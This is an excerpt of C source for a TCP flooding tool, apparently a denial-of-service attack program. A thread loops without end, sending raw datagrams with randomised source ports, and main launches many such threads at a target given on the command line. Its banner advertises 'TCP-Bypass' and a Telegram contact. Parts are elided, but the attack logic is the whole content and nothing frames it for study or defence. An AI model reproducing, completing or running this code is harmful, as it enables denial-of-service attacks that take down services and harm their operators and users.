...
void *flooding_thread(void *par1)
{
    ...
    int randSP = random_number_beetwhen(55000, 64932);
    ...
    while (1)
    {
        ...
        if (sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)       /* a normal send() */
        {
            ...
            randSP = random_number_beetwhen(55000, 64932);
            tcph->source = randSP;
...
{
    if(argc < 6){
        fprintf(stderr, "[+] TCP-Bypass No Need Sepoof\n");
        fprintf(stderr, "Need Help?, Contact @bboscat at Tele\n");
    ...
    for(bboscat = 0;bboscat<num_threads;bboscat++){
      pthread_create( &thread[bboscat], NULL, &flooding_thread, (void *)argv[1]); // Target
    }
